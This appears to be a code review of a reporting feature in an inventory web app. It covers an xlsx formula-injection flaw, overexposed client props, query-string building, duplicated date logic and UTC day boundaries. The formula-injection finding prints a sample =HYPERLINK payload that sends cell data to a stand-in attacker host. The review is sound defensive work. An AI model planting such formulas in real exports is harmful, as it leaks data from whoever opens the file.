---
status: issues_found
files_reviewed: 9
findings:
  critical: 1
  warning: 1
  info: 3
  total: 5
---

# Code Review: Phase 06 (Reports)

## Findings

### CR-01: CSV/Excel formula injection in all three `/api/reports/*` xlsx exports

**Files:** `app/api/reports/inventory/route.ts:15-23`, `app/api/reports/movements/route.ts:47-55`, `app/api/reports/purchase-orders/route.ts:20-29`

None of the three Route Handlers sanitize string cell values before handing them to `XLSX.utils.json_to_sheet(rows)`. Any cell value that begins with `=`, `+`, `-`, `@`, tab, or CR is interpreted by Excel/LibreOffice/Google Sheets as a formula when the exported file is opened — the classic CSV/Excel Formula Injection class (CWE-1236).

The concrete exploit path crosses a real trust boundary in this app: `actions/stock-transactions.ts`'s `recordStockIn`/`recordStockOut` only check `session?.user?.id` (no `requireManager()` gate — see lines 8-9 and 57-58), and `lib/validations/stock-transaction.ts`'s `notes` field is `z.string().optional()` with no character/shape restriction. That means **any authenticated STAFF user** can set a stock transaction's `notes` to a payload such as:

```
=HYPERLINK("http://attacker.example/steal?d="&A2,"Click for details")
```

This flows unmodified into the Movements export's `Notes` column (`app/api/reports/movements/route.ts:47-55`). When a **MANAGER** later exports and opens the report in Excel, the formula renders/executes — enabling phishing, data exfiltration formulas, or (with legacy DDE settings) command execution. `reason` is safely constrained to a `z.enum` so it's not exploitable, but `notes` is fully free text and is the clearest cross-role vector. (`Name`/`SKU`/`Category` in the inventory export and `Supplier`/`Created By` in the PO export are lower risk since those records are MANAGER-only to create/edit, but the same unmitigated write path applies to them too.)

**Suggested fix:** before writing any string field to a sheet, prefix values that start with a formula-trigger character with a neutralizing character (e.g. a leading `'` or space), or use a small shared sanitizer applied uniformly to every string cell across all three routes:

```ts
function sanitizeCell(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value
}
```

Apply it to `Notes`, `Reason` (defense in depth even though currently enum-constrained), `Name`, `SKU`, `Category`, `Product`, `Supplier`, and `Recorded By` / `Created By` columns in all three route handlers.

---

### WR-01: Purchase-orders report spreads the full Prisma record into client props, unlike the other two tabs

**File:** `app/(protected)/reports/page.tsx:67-70`

```ts
purchaseOrderRows = purchaseOrders.map((po) => ({
  ...po,
  totalAmount: po.totalAmount.toNumber(),
}))
```

Unlike `inventoryRows` (lines 33-41) and `movementGroups` (via `groupTransactionsByProduct`), which both explicitly narrow to only the fields the UI needs, this branch spreads the entire `PurchaseOrder` record. Since `purchaseOrder.findMany` (line 59) doesn't `select` scalar fields, the object includes `supplierId`, `createdById`, and `updatedAt` in addition to the fields declared on `PurchaseOrderRow` — all of which get serialized into the RSC payload sent to the `"use client"` `ReportsClient` component and are visible in the page source/devtools to anyone who can reach `/reports` (MANAGER-gated, so impact is limited, but it's still unnecessary exposure of internal FK ids and is inconsistent with the pattern the same file uses two branches earlier).

**Suggested fix:** map explicitly, matching the sibling branches:

```ts
purchaseOrderRows = purchaseOrders.map((po) => ({
  id: po.id,
  poNumber: po.poNumber,
  status: po.status,
  totalAmount: po.totalAmount.toNumber(),
  createdAt: po.createdAt,
  supplier: po.supplier,
  createdBy: po.createdBy,
}))
```

---

### IN-01: Movements export link builds its query string via raw template-literal concatenation

**File:** `app/(protected)/reports/reports-client.tsx:176-180`

```ts
href={`/api/reports/movements?from=${currentParams.from ?? ""}&to=${currentParams.to ?? ""}`}
```

Not exploitable today — the values come from a `type="date"` input, and the Route Handler independently re-validates with `DATE_RE` before use — but it's built by hand instead of `URLSearchParams`/`encodeURIComponent`, so it isn't defended by construction if this pattern is copied for a future free-text query param. Consider `new URLSearchParams({ from: currentParams.from ?? "", to: currentParams.to ?? "" }).toString()`.

---

### IN-02: `resolveDateRange`/`DATE_RE` logic is duplicated verbatim between the page and the movements export route

**Files:** `lib/utils/reports.ts:22-42`, `app/api/reports/movements/route.ts:9-26`

Both copies are byte-for-byte identical. The duplication is called out as intentional in both files' comments ("Route Handler independently re-derives and re-validates its own query rather than sharing state with the page"), so this is a known/accepted design decision rather than an oversight — flagging only because it creates drift risk: a future fix to the date-validation edge cases in one copy (e.g. malformed date components) could easily be applied to only one of the two call sites. If the independence rationale doesn't require duplicated *logic* (only independent *invocation*), extracting to a single shared function imported by both would remove that risk at zero behavioral cost.

---

### IN-03: Movements date-range filter uses UTC day boundaries against an Indonesia-targeted app

**File:** `lib/utils/reports.ts:32-38`, `app/api/reports/movements/route.ts:16-22`

`gte`/`lte` are constructed from `${from}T00:00:00.000Z` / `${to}T23:59:59.999Z` — fixed UTC boundaries. The app's currency formatting (`id-ID`/IDR) suggests an Indonesia-based user base (WIB, UTC+7), so a manager selecting a single day would actually see a window shifted ~7 hours from their local midnight (missing early-morning local transactions, including some from the following day). This is an existing pattern inherited from prior phases (not a regression introduced here) and no timezone requirement is documented in 06-CONTEXT.md, so this is informational only — worth a quick confirmation with stakeholders on whether local-day semantics are expected for this report.
